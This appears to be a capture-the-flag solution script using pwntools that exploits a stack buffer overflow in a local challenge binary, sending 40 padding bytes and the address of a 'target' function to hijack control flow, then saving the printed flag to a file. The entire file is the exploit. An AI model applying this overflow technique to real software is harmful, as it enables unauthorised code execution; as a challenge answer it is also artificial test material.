#!/usr/bin/env python3
from pwn import *
import re
flag_regex = re.compile("(InfoSec{.+[^}]})")
flag = ""

e = ELF("./main.elf")

# target address = 0x401e2b
target_addr = e.symbols["target"]
target_addr_bytes = p32(target_addr)

p = process("./main.elf")
p.send(b'\x61' * 40)
p.send(target_addr_bytes)
p.send(b'\x00')
flag = str(p.recvall())

#Print the flag
print(flag)
#Write the flag to the solution file
solution = open("solution.txt", "w")
solution.write(flag)
solution.close()
